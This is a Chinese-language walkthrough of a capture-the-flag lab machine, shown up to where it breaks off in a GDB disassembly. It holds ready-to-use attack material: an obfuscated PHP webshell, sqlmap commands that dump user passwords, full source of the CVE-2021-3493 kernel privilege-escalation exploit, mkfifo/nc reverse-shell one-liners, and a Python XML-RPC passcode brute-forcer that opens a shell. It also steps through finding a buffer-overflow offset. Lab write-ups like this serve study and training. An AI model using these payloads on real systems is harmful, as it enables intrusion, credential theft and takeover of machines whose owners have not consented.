---
title: 打靶练习5-hard_socnet2
tags: 打靶
categories: 红队技术
date: 2022-11-18 09:37:58
---




CVE-2021-3943 | xmlrpc利用 | python升级shell | GDB | 缓冲区溢出

<!-- more -->

## 1. 主机发现

### arp主机发现

使用arp进行主机发现

```
[root@kali ~]# arp-scan -l
Interface: eth0, type: EN10MB, MAC: 00:0c:29:03:ac:71, IPv4: 172.16.42.147
Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)
172.16.42.1	00:50:56:c0:00:08	VMware, Inc.
172.16.42.205	08:00:27:17:42:82	PCS Systemtechnik GmbH
172.16.42.254	00:50:56:fd:c7:e1	VMware, Inc
```

明显172.16.42.205就是我们的靶机地址了。





### nmap全端口扫描

```
[root@kali ~]# nmap -p- 172.16.42.205
Starting Nmap 7.91 ( https://nmap.org ) at 2022-11-13 02:30 EST
Nmap scan report for 172.16.42.205
Host is up (0.00040s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8000/tcp open  http-alt
MAC Address: 08:00:27:17:42:82 (Oracle VirtualBox virtual NIC)
```



### nmap服务识别

```
[root@kali ~]# nmap -p22,80,8000 -sV 172.16.42.205
Starting Nmap 7.91 ( https://nmap.org ) at 2022-11-13 02:32 EST
Nmap scan report for 172.16.42.205
Host is up (0.00042s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
8000/tcp open  http    BaseHTTPServer 0.3 (Python 2.7.15rc1)
MAC Address: 08:00:27:17:42:82 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```







## web入侵



### 文件上传webshell

访问`http://172.16.42.205/` , 注册一个账号

头像处上穿马获取到shell，使用的webshell `https://github.com/AntSwordProject/AwesomeScript/blob/master/php/php_create_function_script.php`

```php
<?php 
/**
*              _   ____                       _
*   __ _ _ __ | |_/ ___|_      _____  _ __ __| |
*  / _` | '_ \| __\___ \ \ /\ / / _ \| '__/ _` |
* | (_| | | | | |_ ___) \ V  V / (_) | | | (_| |
*  \__,_|_| |_|\__|____/ \_/\_/ \___/|_|  \__,_|
* ———————————————————————————————————————————————
*     AntSword PHP Create_Function Script
* 
*     警告：
*         此脚本仅供合法的渗透测试以及爱好者参考学习
*          请勿用于非法用途，否则将追究其相关责任！
* ———————————————————————————————————————————————
*  pwd = ant
*/
$ant=create_function("", base64_decode('QGV2YWwoJF9QT1NUWyJhbnQiXSk7'));
$ant();
?>
```





### sql注入

搜索处存在sql注入

抓包，保存为txt，用sqlmap跑一跑

```
sqlmap -r a.txt -p "query"
```



**查看数据库**

```
sqlmap -r a.txt -p "query" --dbs

[*] information_schema
[*] mysql
[*] performance_schema
[*] socialnetwork
[*] sys
```



**查看表**

```
sqlmap -r a.txt -p "query" -D socialnetwork --tables

[4 tables]
+------------+
| friendship |
| posts      |
| user_phone |
| users      |
+------------+
```



**查看字段**

```
sqlmap -r a.txt -p "query" -D socialnetwork -T users --columns

+----------------+--------------+
| Column         | Type         |
+----------------+--------------+
| user_about     | text         |
| user_birthdate | date         |
| user_email     | varchar(255) |
| user_firstname | varchar(20)  |
| user_gender    | char(1)      |
| user_hometown  | varchar(255) |
| user_id        | int(11)      |
| user_lastname  | varchar(20)  |
| user_nickname  | varchar(20)  |
| user_password  | varchar(255) |
| user_status    | char(1)      |
+----------------+--------------+
```



**查看字段内容**

```
sqlmap -r a.txt -p "query" -D socialnetwork -T users -C "user_password, user_email" --dump
```









## CVE-2021-3493提权

查看内核版本

```
(www-data:/var/www/html/data/images/posts) $ uname -a
Linux socnet2 4.15.0-38-generic #41-Ubuntu SMP Wed Oct 10 10:59:38 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
```



查看系统版本

```
(www-data:/var/www/html/data/images/posts) $ lsb_release -a
No LSB modules are available.
Distributor ID:    Ubuntu
Description:    Ubuntu 18.04.1 LTS
Release:    18.04
Codename:    bionic
```



### CVE-2021-3493

**Affected Versions**

- Ubuntu 20.10
- Ubuntu 20.04 LTS
- Ubuntu 19.04
- Ubuntu 18.04 LTS
- Ubuntu 16.04 LTS
- Ubuntu 14.04 ESM



可以看见18.04是存在cve-2021-3493的



漏洞利用代码：https://github.com/briskets/CVE-2021-3493

- exploit.c

```c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <err.h>
#include <errno.h>
#include <sched.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <sys/mount.h>

//#include <attr/xattr.h>
//#include <sys/xattr.h>
int setxattr(const char *path, const char *name, const void *value, size_t size, int flags);


#define DIR_BASE    "./ovlcap"
#define DIR_WORK    DIR_BASE "/work"
#define DIR_LOWER   DIR_BASE "/lower"
#define DIR_UPPER   DIR_BASE "/upper"
#define DIR_MERGE   DIR_BASE "/merge"
#define BIN_MERGE   DIR_MERGE "/magic"
#define BIN_UPPER   DIR_UPPER "/magic"


static void xmkdir(const char *path, mode_t mode)
{
    if (mkdir(path, mode) == -1 && errno != EEXIST)
        err(1, "mkdir %s", path);
}

static void xwritefile(const char *path, const char *data)
{
    int fd = open(path, O_WRONLY);
    if (fd == -1)
        err(1, "open %s", path);
    ssize_t len = (ssize_t) strlen(data);
    if (write(fd, data, len) != len)
        err(1, "write %s", path);
    close(fd);
}

static void xcopyfile(const char *src, const char *dst, mode_t mode)
{
    int fi, fo;

    if ((fi = open(src, O_RDONLY)) == -1)
        err(1, "open %s", src);
    if ((fo = open(dst, O_WRONLY | O_CREAT, mode)) == -1)
        err(1, "open %s", dst);

    char buf[4096];
    ssize_t rd, wr;

    for (;;) {
        rd = read(fi, buf, sizeof(buf));
        if (rd == 0) {
            break;
        } else if (rd == -1) {
            if (errno == EINTR)
                continue;
            err(1, "read %s", src);
        }

        char *p = buf;
        while (rd > 0) {
            wr = write(fo, p, rd);
            if (wr == -1) {
                if (errno == EINTR)
                    continue;
                err(1, "write %s", dst);
            }
            p += wr;
            rd -= wr;
        }
    }

    close(fi);
    close(fo);
}

static int exploit()
{
    char buf[4096];

    sprintf(buf, "rm -rf '%s/'", DIR_BASE);
    system(buf);

    xmkdir(DIR_BASE, 0777);
    xmkdir(DIR_WORK,  0777);
    xmkdir(DIR_LOWER, 0777);
    xmkdir(DIR_UPPER, 0777);
    xmkdir(DIR_MERGE, 0777);

    uid_t uid = getuid();
    gid_t gid = getgid();

    if (unshare(CLONE_NEWNS | CLONE_NEWUSER) == -1)
        err(1, "unshare");

    xwritefile("/proc/self/setgroups", "deny");

    sprintf(buf, "0 %d 1", uid);
    xwritefile("/proc/self/uid_map", buf);

    sprintf(buf, "0 %d 1", gid);
    xwritefile("/proc/self/gid_map", buf);

    sprintf(buf, "lowerdir=%s,upperdir=%s,workdir=%s", DIR_LOWER, DIR_UPPER, DIR_WORK);
    if (mount("overlay", DIR_MERGE, "overlay", 0, buf) == -1)
        err(1, "mount %s", DIR_MERGE);

    // all+ep
    char cap[] = "\x01\x00\x00\x02\xff\xff\xff\xff\x00\x00\x00\x00\xff\xff\xff\xff\x00\x00\x00\x00";

    xcopyfile("/proc/self/exe", BIN_MERGE, 0777);
    if (setxattr(BIN_MERGE, "security.capability", cap, sizeof(cap) - 1, 0) == -1)
        err(1, "setxattr %s", BIN_MERGE);

    return 0;
}

int main(int argc, char *argv[])
{
    if (strstr(argv[0], "magic") || (argc > 1 && !strcmp(argv[1], "shell"))) {
        setuid(0);
        setgid(0);
        execl("/bin/bash", "/bin/bash", "--norc", "--noprofile", "-i", NULL);
        err(1, "execl /bin/bash");
    }

    pid_t child = fork();
    if (child == -1)
        err(1, "fork");

    if (child == 0) {
        _exit(exploit());
    } else {
        waitpid(child, NULL, 0);
    }

    execl(BIN_UPPER, BIN_UPPER, "shell", NULL);
    err(1, "execl %s", BIN_UPPER);
}
```



上传exploit.c到蚁剑，执行

```
gcc exploit.c -o exploit
./exploit

#发现报错
bash: cannot set terminal process group (1301): Inappropriate ioctl for device
bash: no job control in this shell
bash-4.4# exit
```

应该是蚁剑的shell问题。

所以我们反弹shell



### mkfifo反弹shell

由于目标机的nc不支持-e参数，所以我们用mkfifo的堆栈操作实现反弹shell

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 172.16.42.147 4444>/tmp/f
```

kali监听执行

```
#反弹shell监听
[root@kali /tmp]# nc -lvvp 4444
listening on [any] 4444 ...
172.16.42.205: inverse host lookup failed: Host name lookup failure
connect to [172.16.42.147] from (UNKNOWN) [172.16.42.205] 35606
bash: cannot set terminal process group (1301): Inappropriate ioctl for device
bash: no job control in this shell


#查看当前账号
www-data@socnet2:/var/www/html/data/images/posts$ whoami
whoami
www-data


#python简单升级终端
www-data@socnet2:/var/www/html/data/images/posts$ python -c 'import pty; pty.spawn("/bin/bash")'
<sts$ python -c 'import pty; pty.spawn("/bin/bash")'


#漏洞利用
www-data@socnet2:/var/www/html/data/images/posts$ ./exploit
./exploit
bash: cannot set terminal process group (1301): Inappropriate ioctl for device
bash: no job control in this shell
bash-4.4# whoami
whoami
root
```

成功提权。







## 提权到socnet账号



### 信息收集

进入socnet账号目录

```
www-data@socnet2:/home/socnet$ ls
ls
add_record  monitor.py	peda
```

查看monitor进程(web应用中管理员有提到该程序)

```
www-data@socnet2:/home/socnet$ ps aux | grep monitor
ps aux | grep monitor
socnet    1088  0.0  0.0   4628   780 ?        Ss   00:56   0:00 /bin/sh -c /usr/bin/python /home/socnet/monitor.py
socnet    1094  0.0  1.3  42960 13252 ?        S    00:56   0:02 /usr/bin/python /home/socnet/monitor.py
```



monitor源码

```
www-data@socnet2:/home/socnet$ cat monitor.py
cat monitor.py
#my remote server management API
import SimpleXMLRPCServer
import subprocess
import random

debugging_pass = random.randint(1000,9999)

def runcmd(cmd):
    results = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    output = results.stdout.read() + results.stderr.read()
    return output

def cpu():
    return runcmd("cat /proc/cpuinfo")

def mem():
    return runcmd("free -m")

def disk():
    return runcmd("df -h")

def net():
    return runcmd("ip a")

def secure_cmd(cmd,passcode):
    if passcode==debugging_pass:
         return runcmd(cmd)
    else:
        return "Wrong passcode."

server = SimpleXMLRPCServer.SimpleXMLRPCServer(("0.0.0.0", 8000))
server.register_function(cpu)
server.register_function(mem)
server.register_function(disk)
server.register_function(net)
server.register_function(secure_cmd)

server.serve_forever()
```





### 编写xmlrpc exploit

查询https://docs.python.org/3/library/xmlrpc.server.html#simplexmlrpcserver-example官方client demo

- client官方demo

```
import xmlrpc.client

s = xmlrpc.client.ServerProxy('http://localhost:8000')
print(s.pow(2,3))  # Returns 2**3 = 8
print(s.add(2,3))  # Returns 5
print(s.mul(5,2))  # Returns 5*2 = 10

# Print list of available methods
print(s.system.listMethods())
```

我们只要实现客户端的xmlrpc，暴力破解debugging_pass，即可利用成功



尝试调用cpu方法。

- xmlclient.py

```python
import xmlrpc.client

s = xmlrpc.client.ServerProxy('http://172.16.42.205:8000')
print(s.cpu())  # Returns 2**3 = 8
```



```
[root@kali /tmp]# python3 xmlclient.py
processor	: 0
vendor_id	: GenuineIntel
cpu family	: 6
model		: 126
model name	: Intel(R) Core(TM) i5-1038NG7 CPU @ 2.00GHz
stepping	: 5
cpu MHz		: 1996.800
cache size	: 6144 KB
```



执行成功。



### 爆破密码

```
import xmlrpc.client

s = xmlrpc.client.ServerProxy('http://172.16.42.205:8000')
for p in range(1000,10000):
	result = str(s.secure_cmd('id', p))
	if not "Wrong" in result:
		print(p)
		print(result)
		break

```



执行成功

```
[root@kali /tmp]# python3 xmlclient.py
3599
uid=1000(socnet) gid=1000(socnet) groups=1000(socnet),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
```



### 反弹脚本

```
import xmlrpc.client

s = xmlrpc.client.ServerProxy('http://172.16.42.205:8000')

cmd = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 172.16.42.147 5555>/tmp/f"
result = str(s.secure_cmd(cmd, 3599))
print(str(result))
```

执行，收到反弹的shell

```
[root@kali /tmp]# python3 xmlclient.py

#监听收到了socnet账号的shell
[root@kali ~]# nc -lvvp 5555
listening on [any] 5555 ...
172.16.42.205: inverse host lookup failed: Host name lookup failure
connect to [172.16.42.147] from (UNKNOWN) [172.16.42.205] 38896
bash: cannot set terminal process group (1088): Inappropriate ioctl for device
bash: no job control in this shell
socnet@socnet2:~$
```



### python升级shell

```
python -c 'import pty; pty.spawn("/bin/bash")'
```







## 使用GDB进行缓存区溢出漏洞挖掘

### 信息收集

查看add_record的文件头

```
socnet@socnet2:~$ file add_record
file add_record
add_record: setuid, setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=e3fa9a66b0b1e3281ae09b3fb1b7b82ff17972d8, not strippe
```

查看文件权限

```
socnet@socnet2:~$ ls -l
ls -l
total 16
-rwsrwsr-x 1 root   socnet 6952 Oct 29  2018 add_record
-rw-rw-r-- 1 socnet socnet  904 Oct 29  2018 monitor.py
drwxrwxr-x 4 socnet socnet 4096 Oct 29  2018 ped
```

可以确定add_record开启了suid权限。文件权限为root。

PEDA - Python Exploit Development Assistance for GDB。peda是用来辅助gdb调试的python脚本。



### gdb调试进行缓冲区溢出漏洞挖掘

安静模式启动gdb

```
gdb -q ./add_record
```

执行`r`，程序加载执行

```
gdb-peda$ r
```

另启一个终端，打印500个字符A

```
[root@kali ~]# python -c "print('A'*500)"
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

复制A字符串，查看`Employee Name(char)`是否存在缓冲区溢出

```
gdb-peda$ r
r
Starting program: /home/socnet/add_record
Welcome to Add Record application
Use it to add info about Social Network 2.0 Employees
Employee Name(char): AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Years worked(int): Salary(int): Ever got in trouble? 1 (yes) or 0 (no): Employee data you've entered:
Name AAAAAAAAAAAAAAAAAAAAAAAA
Years -136196023, Salary -8493, Trouble 8, Comments NA
[Inferior 1 (process 17994) exited normally]
Warning: not running or target is remot
```

直接退出了，正常退出，所以应该不存在溢出漏洞。



测试`Years worked(int)`也不存在

```
gdb-peda$ r
r
Starting program: /home/socnet/add_record
Welcome to Add Record application
Use it to add info about Social Network 2.0 Employees
Employee Name(char): a
a
Years worked(int): AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Salary(int): Ever got in trouble? 1 (yes) or 0 (no): Employee data you've entered:
Name a

Years -136196023, Salary -8493, Trouble 8, Comments NA
[Inferior 1 (process 18105) exited normally]
Warning: not running or target is remote
```



继续测试，发现Explain存在内存溢出

```
gdb-peda$ r
r
Starting program: /home/socnet/add_record
Welcome to Add Record application
Use it to add info about Social Network 2.0 Employees
Employee Name(char): a
a
Years worked(int): 1
1
Salary(int): 1
1
Ever got in trouble? 1 (yes) or 0 (no): 1
1
Explain: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0xffffdc0e ('A' <repeats 200 times>...)
EBX: 0x41414141 ('AAAA')
ECX: 0xffffde60 --> 0x0
EDX: 0xffffde02 --> 0x41414100 ('')
ESI: 0xf7fc2000 --> 0x1d4d6c
EDI: 0xffffdcd0 ('A' <repeats 200 times>...)
EBP: 0x41414141 ('AAAA')
ESP: 0xffffdc50 ('A' <repeats 200 times>...)
EIP: 0x41414141 ('AAAA')
EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x41414141
[------------------------------------stack-------------------------------------]
0000| 0xffffdc50 ('A' <repeats 200 times>...)
0004| 0xffffdc54 ('A' <repeats 200 times>...)
0008| 0xffffdc58 ('A' <repeats 200 times>...)
0012| 0xffffdc5c ('A' <repeats 200 times>...)
0016| 0xffffdc60 ('A' <repeats 200 times>...)
0020| 0xffffdc64 ('A' <repeats 200 times>...)
0024| 0xffffdc68 ('A' <repeats 200 times>...)
0028| 0xffffdc6c ('A' <repeats 200 times>...)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x41414141 in ?? (
```

缓冲区溢出需要重点关注EIP这个寄存器（`EIP: 0x41414141 ('AAAA')` ）。EIP保存的数值是CPU接下来需要执行指令的内存地址编号。我们需要确定EIP中的4个A究竟是哪4个A。将这四个A替换成payload的内存地址，就可以执行payload。



### gdb特征字符

通过修改AAA的数量，确定字符小于100也能造成缓冲区溢出。

通过gdb生成特征字符（每四个字符都不一样）

```
gdb-peda$ pattern create 100
pattern create 100
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'
```

放置到Explain里面执行

```
gdb-peda$ r
r
Starting program: /home/socnet/add_record
Welcome to Add Record application
Use it to add info about Social Network 2.0 Employees
Employee Name(char): a
a
Years worked(int): 1
1
Salary(int): 1
1
Ever got in trouble? 1 (yes) or 0 (no): 1
1
Explain: AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL
AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL


EIP: 0x41414841 ('AHAA')

0x41414841 in ?? ()
```

EIP的结果是`EIP: 0x41414841 ('AHAA')`



### 使用gdb patter search

```
gdb-peda$ pattern search
pattern search
Registers contain pattern buffer:
EBX+0 found at offset: 54
EBP+0 found at offset: 58
EIP+0 found at offset: 62
Registers point to pattern buffer:
[EAX] --> offset 0 - size ~100
[ESP] --> offset 66 - size ~34
Pattern buffer found at:
0x0804a6d0 : offset    0 - size  100 ([heap])
0xffffdc0e : offset    0 - size  100 ($sp + -0x42 [-17 dwords])
0xffffdc73 : offset    7 - size   93 ($sp + 0x23 [8 dwords])
References to pattern buffer found at:
0xf7fc25cc : 0x0804a6d0 (/lib32/libc-2.27.so)
0xf7fc25d0 : 0x0804a6d0 (/lib32/libc-2.27.so)
0xf7fc25d4 : 0x0804a6d0 (/lib32/libc-2.27.so)
0xf7fc25d8 : 0x0804a6d0 (/lib32/libc-2.27.so)
0xf7fc25dc : 0x0804a6d0 (/lib32/libc-2.27.so)
0xffffd558 : 0x0804a6d0 ($sp + -0x6f8 [-446 dwords])
0xffffdbd8 : 0xffffdc0e ($sp + -0x78 [-30 dwords])
0xffffdbf0 : 0xffffdc0e ($sp + -0x60 [-24 dwords])
0xf7ea0037 : 0xffffdc73 (/lib32/libc-2.27.so)
```

重点关注`EIP+0 found at offset: 62`，他的偏移量是62，也就是说从63个字符开始，就会进入EIP寄存器中。

按照推断，我们生成62个A，再加上4个其他字符，那边EIP就是我们指定的4个字符了

还是使用python生成：

```
[root@kali ~]# python -c "print('A'*62 + 'BCDE')"
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABCDE
```



gdb执行

```
r
Starting program: /home/socnet/add_record
Welcome to Add Record application
Use it to add info about Social Network 2.0 Employees
Employee Name(char): 1
1
......

EIP: 0x45444342 ('BCDE')

......
EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)

gdb-peda$
```



验证猜想成功，就是BCDE。

`EIP: 0x45444342 ('BCDE')`

42表示B的ASCII编码，43表示D，44表示C，45表示B。



### GDB调试

查看main函数的汇编指令。

```
gdb-peda$ disas main
disas main
Dump of assembler code for function main:
   0x080486d8 <+0>:	lea    ecx,[esp+0x4]
.....
   0x08048729 <+81>:	call   0x8048520 <fopen@plt>
......
   0x0804873d <+101>:	push   eax
   0x0804873e <+102>:	call   0x80484e0 <puts@plt>
......
```

其中call，是调用函数fopen, @plt是指c语言内建函数。

puts是函数一般输出一些内容，通过Printf的内建函数输出结果。为了验证猜测，我们可以在put函数之前`0x0804873d`打个断点。

```
gdb-peda$ break *0x0804873d
break *0x0804873d
Breakpoint 1 at 0x804873d
```

执行

```
gdb-peda$ run
run
Starting program: /home/socnet/add_record
[----------------------------------registers-----------------------------------]
EAX: 0x8048974 ("Welcome to Add Record application\nUse it to add info about Social Network 2.0 Employees")
EBX: 0x8049d48 --> 0x8049c58 --> 0x1
ECX: 0xffffffff
EDX: 0xffffffff
ESI: 0xf7fc2000 --> 0x1d4d6c
EDI: 0xffffdcd0 --> 0x8
EBP: 0xffffdd18 --> 0x0
ESP: 0xffffdc54 --> 0x804895a --> 0x6d650061 ('a')
EIP: 0x804873d (<main+101>:	push   eax)
EFLAGS: 0x292 (carry parity ADJUST zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x8048731 <main+89>:	mov    DWORD PTR [ebp-0x1c],eax
   0x8048734 <main+92>:	sub    esp,0xc
   0x8048737 <main+95>:	lea    eax,[ebx-0x13d4]
=> 0x804873d <main+101>:	push   eax
   0x804873e <main+102>:	call   0x80484e0 <puts@plt>
   0x8048743 <main+107>:	add    esp,0x10
   0x8048746 <main+110>:	sub    esp,0xc
   0x8048749 <main+113>:	lea    eax,[ebx-0x137c]
[------------------------------------stack-------------------------------------]
0000| 0xffffdc54 --> 0x804895a --> 0x6d650061 ('a')
0004| 0xffffdc58 --> 0x0
0008| 0xffffdc5c --> 0x80486f4 (<main+28>:	add    ebx,0x1654)
0012| 0xffffdc60 --> 0x0
0016| 0xffffdc64 --> 0x0
0020| 0xffffdc68 --> 0xc2
0024| 0xffffdc6c --> 0x414e ('NA')
0028| 0xffffdc70 --> 0x0
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x0804873d in main ()
```

输入s单步执行

```
gdb-peda$ s
s
[----------------------------------registers-----------------------------------]
EAX: 0x8048974 ("Welcome to Add Record application\nUse it to add info about Social Network 2.0 Employees")
EBX: 0x8049d48 --> 0x8049c58 --> 0x1
ECX: 0xffffffff
EDX: 0xffffffff
```

可以看到EAX就是puts函数的内容。



删除断点

```
gdb-peda$ del 1
del 1
```





查看所有函数函数

```
info func
```



查看vuln函数

```
gdb-peda$ disas vuln
disas vuln
Dump of assembler code for function vuln:
   0x080486ad <+0>:	push   ebp
   0x080486ae <+1>:	mov    ebp,esp
   0x080486b0 <+3>:	push   ebx
   0x080486b1 <+4>:	sub    esp,0x44
   0x080486b4 <+7>:	call   0x80488c2 <__x86.get_pc_thunk.ax>
   0x080486b9 <+12>:	add    eax,0x168f
   0x080486be <+17>:	sub    esp,0x8
